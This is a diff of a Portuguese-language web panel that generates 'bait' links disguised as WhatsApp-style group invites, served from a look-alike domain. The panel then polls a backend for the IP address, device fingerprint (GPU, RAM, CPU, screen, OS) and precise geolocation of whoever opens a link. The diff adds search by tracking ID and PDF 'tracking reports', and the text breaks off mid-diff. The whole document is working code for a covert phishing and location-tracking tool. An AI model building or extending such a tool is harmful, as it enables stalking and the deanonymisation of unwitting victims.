@@ -19,7 +19,7 @@
             gap: 20px; /* Espaço entre as colunas */
         }
         
-        /* Contêiner principal do Gerador de Link */
+        /* Contêiner principal do Gerador de Link E Consulta */
         .container { 
             background: white; 
             padding: 2rem 2.5rem; 
@@ -30,7 +30,7 @@
             flex-shrink: 0; /* Impede que encolha */
         }
         
-        h1 { text-align: center; color: #1c1e21; margin-top: 0; }
+        h1, h2 { text-align: center; color: #1c1e21; margin-top: 0; margin-bottom: 1.5rem;}
         .form-group { margin-bottom: 1.25rem; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; }
         input, select, button, textarea { width: 100%; padding: 0.8rem; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 1rem; font-family: system-ui, sans-serif; }
@@ -97,17 +97,20 @@
             body {
                 flex-direction: column;
                 align-items: center;
-                gap: 10px;
+                gap: 20px; /* Aumenta o gap na vertical */
             }
             .container, #tracking-display {
                 max-width: 90%;
+            }
+            /* Garante que a seção de busca não fique colada no gerador */
+            #search-container {
+                margin-top: 0; 
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Gerador de Link</h1>
+    <div class="container"> <h1>Gerador de Link</h1>
         <div class="form-group">
             <label for="template">Template:</label>
             <select id="template">
@@ -139,22 +142,25 @@
                 <button id="copy-btn">Copiar</button>
             </div>
         </div>
+    </div> <div class="container" id="search-container">
+        <h2>Consultar Rastreamento</h2>
+        <div class="form-group">
+            <label for="search-id-input">ID de Rastreamento:</label>
+            <input type="text" id="search-id-input" placeholder="Cole o ID aqui">
+        </div>
+        <button id="search-btn">Buscar</button>
+        <div class="status" id="search-status" style="margin-top: 1rem;"></div>
     </div>
-    
-    <div id="tracking-display">
-
-        <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
+    <div id="tracking-display"> <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
         <button id="export-pdf-btn" style="margin-top: 20px; background-color: #dc3545;" disabled>Exportar como PDF</button>
 
-        <div id="tracking-status-message" class="status-header">Aguardando geração do link...</div>
+        <div id="tracking-status-message" class="status-header">Aguardando geração ou consulta...</div>
 
         <div id="description-section" class="data-section" style="display: none;">
             <div class="status-header" style="color: #6c757d;">Descrição da Isca</div>
             <div id="description-data"></div>
         </div>
                 
-        
-
         <div id="server-info-section" class="data-section" style="display: none;">
             <div class="status-header" style="color: #6c757d;">Informações de Rede (Server)</div>
             <div id="server-info-data"></div>
@@ -175,12 +181,10 @@
             <div id="error-data"></div>
         </div>
         
-    </div>
-    
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    </div> <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
 <script>
+    // --- Seletores Globais ---
     const generateBtn = document.getElementById('generateBtn');
     const resultContainer = document.getElementById('result-container');
     const resultUrlInput = document.getElementById('result-url');
@@ -199,260 +203,89 @@
     const errorData = document.getElementById('error-data');
     const serverSection = document.getElementById('server-info-section');
     const serverData = document.getElementById('server-info-data');
+    const descriptionSection = document.getElementById('description-section');
+    const descriptionData = document.getElementById('description-data');
 
+    // Elementos do formulário de geração
     const templateSelect = document.getElementById('template');
     const groupTitleInput = document.getElementById('groupTitle');
     const groupImageInput = document.getElementById('groupImage');
-
     const linkDescriptionInput = document.getElementById('linkDescription');
-    const descriptionSection = document.getElementById('description-section');
-    const descriptionData = document.getElementById('description-data');
+    
+    // Elementos do PDF
     const exportPdfBtn = document.getElementById('export-pdf-btn');
 
-    let activeTrackingId = null;
-    let fetchInterval = null;
+    // Elementos da consulta
+    const searchIdInput = document.getElementById('search-id-input');
+    const searchBtn = document.getElementById('search-btn');
+    const searchStatus = document.getElementById('search-status');
+
+    // --- Variáveis Globais ---
+    let activeTrackingId = null; // ID sendo monitorado (gerado ou consultado)
+    let fetchInterval = null;    // Referência ao setInterval para polling
     
+    // URL Base da API
+    const API_BASE_URL = "https://chat.whatsapps.site"; // Ou o URL do seu backend
+
     // Mapeamento de Chaves para exibição limpa
     const KEY_MAP = {
-        // Server Info
-        'clientIp': 'IP',
-        // Device Info (Mantidas do index_temp)
-        'Ptf': 'Plataforma (Ptf)',
-        'Brw': 'Navegador (Brw)',
-        'Ven': 'Fabricante GPU',
-        'Cc': 'Núcleos CPU (Cc)',
-        'Ram': 'RAM (GB)',
-        'Ren': 'GPU Renderer',
-        'Ht': 'Altura Tela',
-        'Wd': 'Largura Tela',
-        'Os': 'OS Completo',
-        // Location Result
-        'Status': 'Status',
-        'Lat': 'Latitude',
-        'Lon': 'Longitude',
-        'Acc': 'Precisão (m)',
-        'Alt': 'Altitude',
-        'Dir': 'Direção',
-        'Spd': 'Velocidade',
-        'trackingId': 'Tracking ID'
+        'clientIp': 'IP', 'Ptf': 'Plataforma (Ptf)', 'Brw': 'Navegador (Brw)',
+        'Ven': 'Fabricante GPU', 'Cc': 'Núcleos CPU (Cc)', 'Ram': 'RAM (GB)',
+        'Ren': 'GPU Renderer', 'Ht': 'Altura Tela', 'Wd': 'Largura Tela',
+        'Os': 'OS Completo', 'Status': 'Status', 'Lat': 'Latitude',
+        'Lon': 'Longitude', 'Acc': 'Precisão (m)', 'Alt': 'Altitude',
+        'Dir': 'Direção', 'Spd': 'Velocidade', 'trackingId': 'Tracking ID'
     };
 
+    // --- Funções Auxiliares ---
 
+    // Copiar para área de transferência
     copyBtn.addEventListener('click', () => {
         resultUrlInput.select();
-        document.execCommand('copy');
-        copyBtn.textContent = 'Copiado!';
+        try {
+            document.execCommand('copy');
+            copyBtn.textContent = 'Copiado!';
+        } catch (err) {
+            copyBtn.textContent = 'Falhou!';
+            console.error('Erro ao copiar:', err);
+        }
         setTimeout(() => { copyBtn.textContent = 'Copiar'; }, 2000);
     });
     
-    // Função para renderizar um objeto de dados em HTML formatado (melhor mapeamento)
+    // Renderizar dados na UI
     function renderData(data, targetElement) {
         let html = '';
-        
-        // Define a ordem para Localização
-        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
-
-        // Ordena chaves para Location, senão usa a ordem natural
+        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd'];
         const keys = (targetElement.id === 'location-data') 
-            ? Object.keys(data).sort((a, b) => locationOrder.indexOf(a) - locationOrder.indexOf(b))
+            ? Object.keys(data).sort((a, b) => {
+                const idxA = locationOrder.indexOf(a);
+                const idxB = locationOrder.indexOf(b);
+                if (idxA !== -1 && idxB !== -1) return idxA - idxB;
+                if (idxA !== -1) return -1;
+                if (idxB !== -1) return 1;
+                return 0; // Mantém ordem original para chaves não listadas
+              })
             : Object.keys(data);
 
-
         for (const key of keys) {
-            if (key === 'trackingId') continue; // Evita repetição
-
-            // Mapeia para o nome legível, senão usa o padrão
+            if (key === 'trackingId') continue; // Já exibido no título
             const formattedKey = KEY_MAP[key] || key.replace(/([A-Z])/g, ' $1').trim();
-            const displayValue = data[key];
-            
-            let valueHtml = displayValue;
+            let displayValue = data[key] === null || data[key] === undefined ? 'N/A' : data[key];
+            let valueHtml = String(displayValue); // Converte para string
 
-            // Estilização especial para IPs longos
-            if (key === 'clientIp' && displayValue.length > 20) {
-                 valueHtml = `<span style="word-break: break-all;">${displayValue}</span>`;
+            if (key === 'clientIp' && valueHtml.length > 20) {
+                 valueHtml = `<span style="word-break: break-all;">${valueHtml}</span>`;
             }
+             if (key === 'Os' && valueHtml.includes('(')) { // Limpa User Agent longo
+                 valueHtml = valueHtml.substring(0, valueHtml.indexOf('(')).trim();
+             }
             
             html += `<div class="data-item"><strong>${formattedKey}:</strong> ${valueHtml}</div>`;
         }
-        targetElement.innerHTML = html;
+        targetElement.innerHTML = html || '<div class="data-item">Nenhum dado disponível.</div>';
     }
 
-    // Função principal de busca de status de rastreamento
-    async function fetchTrackingStatus() {
-        if (!activeTrackingId) return;
-
-        try {
-            const fetchUrl = `${API_BASE_URL}/api/status?id=${activeTrackingId}`;
-
-            // NOVO LOG 1: O que estamos prestes a tentar buscar
-            console.log(`[DEBUG FETCH] Tentando buscar status em: ${fetchUrl}`);
-
-            const response = await fetch(fetchUrl);
-
-            if (!response.ok) {
-                // NOVO LOG 2: Se o servidor responder, mas com erro HTTP (404, 500, etc.)
-                console.error(`[DEBUG HTTP ERRO] Status: ${response.status}. URL: ${fetchUrl}`);
-                throw new Error(`HTTP Error: ${response.status}`);
-            }
-            
-            const data = await response.json();
-            
-            // Reseta a exibição para o ciclo atual
-            serverSection.style.display = 'none';
-            deviceSection.style.display = 'none';
-            locationSection.style.display = 'none';
-            errorSection.style.display = 'none';
-            descriptionSection.style.display = 'none';
-
-            let status = 'Aguardando o recebimento de informações...';
-
-            if (data.status === 'RECEIVED') {
-                status = '✅ Informações recebidas!';
-
-                // Exibe Descrição
-                if (data.description) {
-                    descriptionSection.style.display = 'block';
-                    // Renderiza o título da isca e a descrição juntos
-                    descriptionData.innerHTML = `
-                        <div class="data-item"><strong>Título:</strong> ${data.title}</div>
-                        <div class="data-item" style="border-bottom: none;"><strong>Anotações:</strong> ${data.description.replace(/\n/g, '<br>')}</div>
-                    `;
-                }
-
-                // Exibe Informações do Servidor (IP)
-                if (data.clientIp) {
-                    serverSection.style.display = 'block';
-                    const serverInfo = {};
-                    serverInfo.clientIp = data.clientIp;
-                    renderData(serverInfo, serverData);
-                }
-                
-                // Exibe Informações do Dispositivo (Device Info)
-                if (data.info) {
-                    deviceSection.style.display = 'block';
-                    renderData(data.info, deviceData);
-                }
-
-                // Exibe Localização (Location Result)
-                if (data.result) {
-                    locationSection.style.display = 'block';
-                    renderData(data.result, locationData);
-                    status = '✅ Localização Recebida com Sucesso!';
-                }
-                
-                // Exibe Erros de Localização
-                if (data.error) {
-                    errorSection.style.display = 'block';
-                    renderData(data.error, errorData);
-                    status = '⚠️ Erro ao obter localização.';
-                }
-                
-            } else if (data.status === 'ACTIVE') {
-                 status = 'Aguardando o recebimento de informações...';
-            }
-            
-            trackingStatusMessage.textContent = status;
-
-        } catch (error) {
-            // NOVO LOG 3: Captura a exceção exata (TypeError: Failed to fetch / SyntaxError)
-            console.error(`[DEBUG CATCH] Erro ao buscar status: ${error.name} - ${error.message}`);
-            trackingStatusMessage.textContent = 'Erro de conexão com o servidor de rastreamento: ' + error.name;
-        }
-    }
-
-
-    const API_BASE_URL = "https://chat.whatsapps.site";
-
-    
-    generateBtn.addEventListener('click', async () => {
-        const title = groupTitleInput.value;
-        const description = linkDescriptionInput.value;
-        const template = templateSelect.value;
-        const imageFile = groupImageInput.files[0];
-        
-        // Limpa intervalo anterior se existir
-        if (fetchInterval) clearInterval(fetchInterval);
-
-        // GERA O ID ÚNICO E ATRIBUI À VARIÁVEL ATIVA
-        const tracking_id = generateRandomCode(16); 
-        activeTrackingId = tracking_id;
-        
-        // Limpa a tela de rastreamento
-        currentTrackingId.textContent = activeTrackingId;
-        trackingStatusMessage.textContent = 'Aguardando geração do link...';
-        trackingDisplay.style.display = 'block';
-        deviceSection.style.display = 'none';
-        locationSection.style.display = 'none';
-        errorSection.style.display = 'none';
-        descriptionSection.style.display = 'none';
-        serverSection.style.display = 'none'; // <-- ADICIONE ESTA LINHA
-        deviceData.innerHTML = '';
-        locationData.innerHTML = '';
-        errorData.innerHTML = '';
-        serverData.innerHTML = ''; // <-- ADICIONE ESTA LINHA
-
-
-
-        // EXTRAI A EXTENSÃO
-        let fileExtension = '';
-        if (imageFile) {
-            const fileName = imageFile.name;
-            fileExtension = fileName.substring(fileName.lastIndexOf('.'));
-        }
-
-        if (!title) {
-            alert('Por favor, insira um título.');
-            return;
-        }
-
-        const formData = new FormData();
-        formData.append('template', template);
-        formData.append('groupTitle', title);
-        formData.append('linkDescription', description);
-        formData.append('trackingId', tracking_id); 
-        formData.append('imageExt', fileExtension); 
-        if (imageFile) formData.append('groupImage', imageFile);
-
-        generateBtn.disabled = true;
-        generateBtn.textContent = 'Gerando...';
-        resultContainer.style.display = 'none';
-        statusText.textContent = 'Iniciando serviços, aguarde...';
-
-        try {
-            // CORREÇÃO AQUI: Força a requisição POST para a porta 8888
-            const response = await fetch(`${API_BASE_URL}/generate-link`, { 
-                method: 'POST',
-                body: formData,
-            });
-
-            const data = await response.json();
-
-            if (data.success) {
-                // A URL final é montada no front-end para incluir o ID
-                const base_url = data.url; 
-                const final_url = `${base_url}?id=${tracking_id}`; 
-
-                statusText.textContent = 'Link gerado com sucesso!';
-                resultContainer.style.display = 'block';
-                resultUrlInput.value = final_url;
-                
-                // Inicia a busca de status a cada 3 segundos
-                fetchInterval = setInterval(fetchTrackingStatus, 3000);
-                exportPdfBtn.disabled = false;
-                
-            } else {
-                statusText.textContent = `Erro: ${data.message}`;
-            }
-        } catch (error) {
-            statusText.textContent = 'Erro de conexão com o servidor.';
-            console.error('Erro:', error);
-        } finally {
-            generateBtn.disabled = false;
-            generateBtn.textContent = 'Gerar Link';
-        }
-    });
-
-    // Função separada para gerar código aleatório
+    // Gerar código aleatório
     function generateRandomCode(length = 16) {
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         let result = '';
@@ -462,137 +295,402 @@
         return result;
     }
 
-    // LÓGICA DE EXPORTAÇÃO DE PDF (fora da função generateRandomCode)
-    function objectToTableData(data) {
-    const tableData = [];
-    const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd', 'trackingId'];
-    
-    // Mapeamento de Chaves para exibição limpa (mesmo do renderData)
-    const KEY_MAP_PDF = {
-        'clientIp': 'IP',
-        'Ptf': 'Plataforma (Ptf)',
-        'Brw': 'Navegador (Brw)',
-        'Ven': 'Fabricante GPU',
-        'Cc': 'Núcleos CPU (Cc)',
-        'Ram': 'RAM (GB)',
-        'Ren': 'GPU Renderer',
-        'Ht': 'Altura Tela',
-        'Wd': 'Largura Tela',
-        'Os': 'OS Completo',
-        'Status': 'Status',
-        'Lat': 'Latitude',
-        'Lon': 'Longitude',
-        'Acc': 'Precisão (m)',
-        'Alt': 'Altitude',
-        'Dir': 'Direção',
-        'Spd': 'Velocidade',
-        'trackingId': 'Tracking ID'
-    };
-
-    // Filtra e ordena as chaves
-    const keys = Object.keys(data).sort((a, b) => {
-        // Prioriza a ordem de Localização, senão ordem alfabética
-        const indexA = locationOrder.indexOf(a);
-        const indexB = locationOrder.indexOf(b);
-        if (indexA !== -1 && indexB !== -1) return indexA - indexB;
-        if (indexA !== -1) return -1;
-        if (indexB !== -1) return 1;
-        return a.localeCompare(b);
-    });
-    
-    for (const key of keys) {
-        if (key === 'trackingId') continue;
-        const formattedKey = KEY_MAP_PDF[key] || key.replace(/([A-Z])/g, ' $1').trim();
-        let displayValue = String(data[key]);
-
-        // Formatação para PDF (ex: IPs longos não precisam de span, pois o jsPDF quebra linha automaticamente)
-        if (key === 'Os') {
-            displayValue = displayValue.includes('Windows NT 10.0') ? 'Windows 10/11' : displayValue;
-        }
-
-        tableData.push([formattedKey, displayValue]);
+    // Limpar e preparar área de exibição
+    function resetTrackingDisplay(idToShow) {
+        trackingDisplay.style.display = 'block';
+        currentTrackingId.textContent = idToShow || 'N/A';
+        trackingStatusMessage.textContent = 'Consultando status...';
+        descriptionSection.style.display = 'none';
+        serverSection.style.display = 'none';
+        deviceSection.style.display = 'none';
+        locationSection.style.display = 'none';
+        errorSection.style.display = 'none';
+        descriptionData.innerHTML = '';
+        serverData.innerHTML = '';
+        deviceData.innerHTML = '';
+        locationData.innerHTML = '';
+        errorData.innerHTML = '';
+        exportPdfBtn.disabled = true; // Desabilita PDF por padrão
     }
 
-    return tableData;
-}
+    // Exibir dados recebidos (usado por fetch e search)
+    function displayReceivedData(data) {
+        let mainStatus = 'Status consultado.';
+
+        if (data.status === 'RECEIVED') {
+            mainStatus = '✅ Informações recebidas/encontradas!';
+            exportPdfBtn.disabled = false; // Habilita PDF
+
+            // Exibe Descrição
+            if (data.description || data.title) {
+                descriptionSection.style.display = 'block';
+                descriptionData.innerHTML = `
+                    <div class="data-item"><strong>Título:</strong> ${data.title || 'N/A'}</div>
+                    <div class="data-item" style="border-bottom: none;"><strong>Anotações:</strong> ${(data.description || 'Nenhuma').replace(/\n/g, '<br>')}</div>
+                `;
+            }
+            // Exibe IP
+            if (data.clientIp) {
+                serverSection.style.display = 'block';
+                renderData({ clientIp: data.clientIp }, serverData);
+            }
+            // Exibe Info Dispositivo
+            if (data.info) {
+                deviceSection.style.display = 'block';
+                renderData(data.info, deviceData);
+            }
+            // Exibe Localização
+            if (data.result) {
+                locationSection.style.display = 'block';
+                renderData(data.result, locationData);
+                mainStatus = '✅ Localização encontrada!';
+            }
+            // Exibe Erros
+            if (data.error) {
+                errorSection.style.display = 'block';
+                renderData(data.error, errorData);
+                // Dá prioridade à mensagem de erro se ambos (result e error) existirem
+                mainStatus = '⚠️ Erro registrado ao obter localização.';
+            }
+
+        } else if (data.status === 'ACTIVE') {
+            mainStatus = 'Link ativo, aguardando primeiro acesso...';
+        } else if (data.status === 'INACTIVE' || !data.status) {
+             mainStatus = 'ID não encontrado ou inativo.';
+             trackingDisplay.style.display = 'none'; // Esconde display se inativo
+        } else {
+             mainStatus = `Status desconhecido: ${data.status}`;
+        }
+        
+        trackingStatusMessage.textContent = mainStatus;
+    }
 
 
-    exportPdfBtn.addEventListener('click', () => {
-        // 1. Faz a chamada síncrona/imediata ao /api/status para obter os dados brutos
-        fetch(`${API_BASE_URL}/api/status?id=${activeTrackingId}`)
-            .then(res => res.json())
-            .then(data => {
-                const { jsPDF } = window.jspdf;
-                const doc = new jsPDF('p', 'mm', 'a4'); // 'p'ortrait, 'mm' units, 'a4' size
-                let yOffset = 15;
+    // --- Lógica Principal ---
+
+    // Função de Polling (chamada após gerar link)
+    async function fetchTrackingStatus() {
+        if (!activeTrackingId || !fetchInterval) return; // Só roda se tiver ID ativo e polling iniciado
+
+        try {
+            const fetchUrl = `${API_BASE_URL}/api/status?id=${activeTrackingId}`;
+            console.log(`[DEBUG POLLING] Buscando status em: ${fetchUrl}`);
+            const response = await fetch(fetchUrl);
+
+            if (!response.ok) {
+                console.error(`[DEBUG POLLING ERRO] Status HTTP: ${response.status}. URL: ${fetchUrl}`);
+                trackingStatusMessage.textContent = `Erro ao buscar (${response.status}).`;
+                // Não para o polling em caso de erro temporário, mas poderia parar se fosse 404
+                // if (response.status === 404) clearInterval(fetchInterval); 
+                return;
+            }
+            
+            const data = await response.json();
+            
+            // Usa a função centralizada para exibir os dados
+            displayReceivedData(data);
+
+            // Para o polling se o status for RECEIVED ou INACTIVE
+            if (data.status === 'RECEIVED' || data.status === 'INACTIVE') {
+                console.log(`[DEBUG POLLING] Status final (${data.status}). Parando polling para ${activeTrackingId}.`);
+                clearInterval(fetchInterval);
+                fetchInterval = null;
+            }
+
+        } catch (error) {
+            console.error(`[DEBUG POLLING CATCH] Erro: ${error.name} - ${error.message}`);
+            trackingStatusMessage.textContent = 'Erro de conexão no polling.';
+            // Considerar parar o polling em caso de erro de rede persistente
+            // clearInterval(fetchInterval); fetchInterval = null;
+        }
+    }
+
+    // Geração de Link
+    generateBtn.addEventListener('click', async () => {
+        const title = groupTitleInput.value.trim();
+        const description = linkDescriptionInput.value.trim();
+        const template = templateSelect.value;
+        const imageFile = groupImageInput.files[0];
+        
+        if (!title) {
+            alert('Por favor, insira um título para a isca.');
+            return;
+        }
+
+        // Limpa polling anterior
+        if (fetchInterval) clearInterval(fetchInterval); fetchInterval = null;
+
+        const tracking_id = generateRandomCode(16); 
+        activeTrackingId = tracking_id; // Define ID ativo para polling e PDF
+        
+        // Limpa UI
+        resetTrackingDisplay(tracking_id);
+        trackingStatusMessage.textContent = 'Gerando link...';
+        resultContainer.style.display = 'none';
+        statusText.textContent = 'Iniciando serviços, aguarde...';
+        generateBtn.disabled = true;
+        generateBtn.textContent = 'Gerando...';
+
+        // Prepara FormData
+        let fileExtension = '';
+        if (imageFile) {
+            fileExtension = imageFile.name.substring(imageFile.name.lastIndexOf('.'));
+        }
+        const formData = new FormData();
+        formData.append('template', template);
+        formData.append('groupTitle', title);
+        formData.append('linkDescription', description);
+        formData.append('trackingId', tracking_id); 
+        formData.append('imageExt', fileExtension); 
+        if (imageFile) formData.append('groupImage', imageFile);
+
+        // Chamada API para gerar link
+        try {
+            const response = await fetch(`${API_BASE_URL}/generate-link`, { 
+                method: 'POST',
+                body: formData,
+            });
+            const data = await response.json();
+
+            if (data.success && data.url) {
+                const final_url = `${data.url}?id=${tracking_id}`; 
+                statusText.textContent = 'Link gerado com sucesso!';
+                resultContainer.style.display = 'block';
+                resultUrlInput.value = final_url;
+                trackingStatusMessage.textContent = 'Aguardando primeiro acesso...';
                 
-                // --- 1. TÍTULO GERAL E ID ---
+                // Inicia o polling
+                fetchInterval = setInterval(fetchTrackingStatus, 3000); 
+                
+            } else {
+                statusText.textContent = `Erro ao gerar link: ${data.message || 'Erro desconhecido.'}`;
+                 trackingStatusMessage.textContent = 'Falha na geração.';
+                 activeTrackingId = null; // Reseta ID ativo se falhou
+                 trackingDisplay.style.display = 'none';
+            }
+        } catch (error) {
+            statusText.textContent = 'Erro de conexão ao gerar link.';
+            trackingStatusMessage.textContent = 'Erro de conexão.';
+            activeTrackingId = null;
+            trackingDisplay.style.display = 'none';
+            console.error('Erro Geração:', error);
+        } finally {
+            generateBtn.disabled = false;
+            generateBtn.textContent = 'Gerar Link';
+        }
+    });
+
+    // Consulta de Rastreamento
+    searchBtn.addEventListener('click', async () => {
+        const trackingIdToSearch = searchIdInput.value.trim();
+
+        if (!trackingIdToSearch) {
+            searchStatus.textContent = 'Por favor, insira um ID de rastreamento.';
+            searchStatus.style.color = '#dc3545';
+            return;
+        }
+
+        // Limpa polling anterior
+        if (fetchInterval) {
+            clearInterval(fetchInterval);
+            fetchInterval = null;
+            console.log('[DEBUG SEARCH] Intervalo de polling anterior limpo.');
+        }
+
+        // Feedback visual
+        searchStatus.textContent = 'Buscando informações...';
+        searchStatus.style.color = '#65676b';
+        searchBtn.disabled = true;
+        resetTrackingDisplay(trackingIdToSearch); // Limpa e prepara a área de exibição
+
+        // Chamada API para buscar status
+        try {
+            const fetchUrl = `${API_BASE_URL}/api/status?id=${trackingIdToSearch}`;
+            console.log(`[DEBUG SEARCH] Buscando em: ${fetchUrl}`);
+            const response = await fetch(fetchUrl);
+
+            if (!response.ok) {
+                 searchStatus.textContent = `ID "${trackingIdToSearch}" não encontrado (${response.status}).`;
+                searchStatus.style.color = '#dc3545';
+                trackingStatusMessage.textContent = 'ID não encontrado.';
+                trackingDisplay.style.display = 'none'; // Esconde se não achou
+                activeTrackingId = null; // Reseta ID ativo
+                 console.error(`[DEBUG SEARCH ERRO] Status HTTP: ${response.status}.`);
+                 return; 
+            }
+
+            const data = await response.json();
+            searchStatus.textContent = ''; // Limpa status da busca se ok
+
+            // Define o ID consultado como ativo para o botão PDF
+            activeTrackingId = trackingIdToSearch; 
+            
+            // Usa a função centralizada para exibir os dados
+            displayReceivedData(data); 
+
+        } catch (error) {
+            console.error(`[DEBUG SEARCH CATCH] Erro: ${error.name} - ${error.message}`);
+             searchStatus.textContent = 'Erro de conexão ou ao processar dados.';
+            searchStatus.style.color = '#dc3545';
+            trackingStatusMessage.textContent = 'Erro na consulta.';
+            trackingDisplay.style.display = 'none';
+            activeTrackingId = null;
+        } finally {
+            searchBtn.disabled = false; // Reabilita o botão
+        }
+    });
+
+    // --- Exportação PDF ---
+    
+    // Converte objeto para dados de tabela PDF
+    function objectToTableData(data) {
+        const tableData = [];
+        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd']; // Ordem específica para localização
+        
+        // Mapeamento específico para PDF (pode ser igual ao KEY_MAP)
+        const KEY_MAP_PDF = { ...KEY_MAP }; // Copia o mapeamento principal
+
+        // Ordena chaves
+        const keys = Object.keys(data).sort((a, b) => {
+            const indexA = locationOrder.indexOf(a);
+            const indexB = locationOrder.indexOf(b);
+            if (indexA !== -1 && indexB !== -1) return indexA - indexB; // Ordena por locationOrder
+            if (indexA !== -1) return -1; // Chaves de locationOrder vêm primeiro
+            if (indexB !== -1) return 1;
+            // Para outras chaves, mantém a ordem ou ordena alfabeticamente
+            // return a.localeCompare(b); // Descomente para ordenar alfabeticamente as demais
+             return 0; // Mantém ordem original das demais
+        });
+        
+        for (const key of keys) {
+            if (key === 'trackingId') continue; // Já está no título do PDF
+            const formattedKey = KEY_MAP_PDF[key] || key.replace(/([A-Z])/g, ' $1').trim();
+            let displayValue = data[key] === null || data[key] === undefined ? 'N/A' : String(data[key]);
+
+            // Formatação específica para PDF
+            if (key === 'Os' && displayValue.includes('Windows NT 10.0')) {
+                 displayValue = 'Windows 10/11';
+            }
+             if (key === 'Os' && displayValue.includes('(')) { // Limpa User Agent longo
+                 displayValue = displayValue.substring(0, displayValue.indexOf('(')).trim();
+             }
+
+            tableData.push([formattedKey, displayValue]);
+        }
+        return tableData;
+    }
+
+    // Evento do botão Exportar PDF
+    exportPdfBtn.addEventListener('click', () => {
+        if (!activeTrackingId) {
+            alert("Nenhum ID de rastreamento ativo para exportar.");
+            return;
+        }
+
+        // Busca os dados mais recentes antes de exportar
+        fetch(`${API_BASE_URL}/api/status?id=${activeTrackingId}`)
+            .then(res => {
+                if (!res.ok) throw new Error(`Falha ao buscar dados: ${res.status}`);
+                return res.json();
+            })
+            .then(data => {
+                if (data.status !== 'RECEIVED') {
+                    alert("Ainda não há dados recebidos para este ID.");
+                    return;
+                }
+
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF('p', 'mm', 'a4'); 
+                let yOffset = 15;
+                const pageHeight = doc.internal.pageSize.height;
+                const marginBottom = 15; // Margem inferior
+
+                // Função para adicionar nova página se necessário
+                const checkNewPage = (neededHeight) => {
+                    if (yOffset + neededHeight > pageHeight - marginBottom) {
+                        doc.addPage();
+                        yOffset = 15; // Reinicia yOffset na nova página
+                    }
+                };
+                
+                // --- TÍTULO GERAL E ID ---
                 doc.setFontSize(16);
                 doc.text(`Relatório de Rastreamento`, 10, yOffset);
                 yOffset += 8;
                 doc.setFontSize(10);
+                doc.setTextColor(100); // Cinza
                 doc.text(`Tracking ID: ${activeTrackingId}`, 10, yOffset);
                 yOffset += 10;
+                doc.setTextColor(0); // Preto
 
-                // --- 2. DESCRIÇÃO DA ISCA ---
+                // --- DESCRIÇÃO DA ISCA ---
                 if (data.title || data.description) {
+                     checkNewPage(20); // Altura estimada para esta seção
                     doc.setFontSize(12);
                     doc.text('Descrição da Isca', 10, yOffset);
                     yOffset += 6;
                     doc.setFontSize(10);
                     
-                    // Exibe o Título
-                    doc.text(`Título: ${data.title || 'N/A'}`, 10, yOffset);
+                    doc.setFont(undefined, 'bold');
+                    doc.text(`Título:`, 10, yOffset);
+                    doc.setFont(undefined, 'normal');
+                    doc.text(`${data.title || 'N/A'}`, 30, yOffset);
                     yOffset += 6;
                     
-                    // Exibe a Descrição/Anotações com quebra de linha
+                    doc.setFont(undefined, 'bold');
+                    doc.text(`Anotações:`, 10, yOffset);
+                    doc.setFont(undefined, 'normal');
                     const annotations = data.description || 'Nenhuma anotação fornecida.';
-                    const textLines = doc.splitTextToSize(`Anotações: ${annotations}`, 180); // 180mm de largura
-                    doc.text(textLines, 10, yOffset);
-                    yOffset += (textLines.length * 5) + 5; // Aumenta o offset baseado nas linhas
+                    const textLines = doc.splitTextToSize(annotations, 170); // Largura um pouco menor
+                    doc.text(textLines, 30, yOffset);
+                    yOffset += (textLines.length * 5) + 5; 
                 }
 
-                // --- 3. DADOS DE REDE E DISPOSITIVO (TABELA 1) ---
+                const headStyles = { fillColor: [220, 220, 220], textColor: [0, 0, 0], fontStyle: 'bold' };
+                const tableConfig = {
+                    startY: yOffset + 4,
+                    head: [['Campo', 'Valor']],
+                    theme: 'striped',
+                    styles: { fontSize: 9, cellPadding: 2 },
+                    headStyles: headStyles,
+                    columnStyles: { 0: { fontStyle: 'bold', cellWidth: 50 } }, // Ajuste cellWidth conforme necessário
+                    margin: { left: 10, right: 10 },
+                    didDrawPage: (hookData) => { yOffset = hookData.cursor.y; } // Atualiza yOffset após desenhar
+                };
+
+                // --- DADOS DE REDE E DISPOSITIVO (TABELA 1) ---
+                 checkNewPage(20); // Estimativa inicial para título + algumas linhas
                 doc.setFontSize(12);
                 doc.text('Dados de Coleta (Rede e Dispositivo)', 10, yOffset);
                 yOffset += 2;
                 
-                const serverInfo = {};
-                if (data.clientIp) serverInfo.clientIp = data.clientIp;
-                
-                const deviceDataStore = {...serverInfo, ...data.info};
-                
-                const headStyles = { fillColor: [200, 200, 200], textColor: [0, 0, 0] };
-                
-                doc.autoTable({
-                    startY: yOffset + 4,
-                    head: [['Campo', 'Valor']],
-                    body: objectToTableData(deviceDataStore),
-                    theme: 'striped',
-                    styles: { fontSize: 9 },
-                    headStyles: headStyles,
-                    columnStyles: { 0: { fontStyle: 'bold', cellWidth: 40 } }
-                });
-                yOffset = doc.autoTable.previous.finalY;
+                const combinedData = { ...(data.clientIp ? { clientIp: data.clientIp } : {}), ...data.info };
+                if (Object.keys(combinedData).length > 0) {
+                    doc.autoTable({ ...tableConfig, body: objectToTableData(combinedData) });
+                    // yOffset é atualizado pelo hook didDrawPage
+                } else {
+                     doc.setFontSize(9);
+                     doc.text("Nenhum dado de rede/dispositivo coletado.", 10, yOffset + 6);
+                     yOffset += 10;
+                }
 
-                // --- 4. DADOS DE LOCALIZAÇÃO (TABELA 2) ---
